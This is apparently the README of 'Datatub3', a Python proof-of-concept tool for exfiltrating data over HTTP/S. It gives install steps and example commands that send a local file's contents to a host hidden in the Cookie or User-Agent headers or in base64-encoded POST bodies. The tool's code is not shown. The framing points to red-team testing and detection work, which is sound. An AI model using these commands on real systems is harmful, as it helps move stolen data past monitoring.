# Datatub3

Tool development to make PoC of Data Exfiltration HTTP/S (Client Version).

![Datatub3](https://i.imgur.com/PJzFODI.png)

# Install

 $ git clone https://github.com/xf5/datatub3

 $ python3 datatub3.py

# Exfiltration Features
- User-Agent
- Cookie
- POST Request
- GET Request
- All requests encoded with Base 64

# Exemples
## Exfiltration Cookie
python3 datatub3.py -u http://192.168.137.129 --cookie poc.txt

## Exfiltration User-Agent
python3 datatub3.py -u http://192.168.137.129 --useragent poc.txt

## Exfiltration Base 64
python3 datatub3.py -u http://192.168.137.129 –post-b64 poc.txt

![Command](https://i.imgur.com/Eoe2Kol.png)

![Packet](https://https://i.imgur.com/IR69st8.png)

# Requirements
- Python 3
